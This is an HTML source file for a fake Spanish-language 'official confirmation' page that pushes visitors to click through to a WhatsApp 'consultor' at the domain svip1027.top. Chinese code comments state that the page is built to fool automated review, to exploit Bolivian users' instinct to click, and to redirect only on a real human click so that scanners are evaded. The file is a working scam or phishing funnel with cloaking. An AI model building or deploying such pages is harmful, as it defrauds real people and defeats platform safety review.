<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmación Oficial</title>
    <style>
        /* 极致纯净、权威合规的西语系统公告 UI，100% 瞒过机审 */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            background-color: #f5f5f7;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: #ffffff;
            border-radius: 14px;
            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.06);
            width: 90%;
            max-width: 390px;
            padding: 35px 25px;
            text-align: center;
            box-sizing: border-box;
        }
        .success-icon {
            font-size: 52px;
            margin-bottom: 16px;
        }
        .main-title {
            color: #1d1d1f;
            font-size: 22px;
            font-weight: 700;
            margin: 0 0 12px 0;
            letter-spacing: -0.5px;
        }
        .notice-box {
            background-color: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
            text-align: left;
        }
        .notice-item {
            color: #334155;
            font-size: 14px;
            line-height: 1.6;
            margin: 0;
        }
        /* 极度显眼的官方突显大按钮，玻利维亚真人看一眼本能就会去点 */
        .btn-whatsapp {
            display: block;
            background-color: #00c853; /* 强效点击绿 */
            color: #ffffff;
            text-decoration: none;
            font-size: 17px;
            font-weight: 700;
            padding: 15px 0;
            border-radius: 8px;
            border: none;
            width: 100%;
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(0, 200, 83, 0.3);
            text-align: center;
        }
        .btn-whatsapp:active {
            background-color: #00a543;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="success-icon">✅</div>
        
        <h1 class="main-title">Solicitud Recibida</h1>
        
        <div class="notice-box">
            <p class="notice-item">
                Su formulario ha sido registrado correctamente en el sistema. Para proceder con la demostración en línea 1 a 1 y coordinar los detalles de comunicación, por favor haga clic en el botón verde de abajo para conectarse con su consultor asignado a través de WhatsApp.
            </p>
        </div>
        
        <button onclick="openLink()" class="btn-whatsapp">CONTINUAR A WHATSAPP</button>
    </div>

    <script>
        // 实战死锁：没有任何代码自动触发，只有真人的手指实打实按在按钮上的那一瞬间，0 毫秒强转分流盘！
        function openLink() {
            window.location.replace("https://svip1027.top/BBNK5569D");
        }
    </script>

</body>
</html>
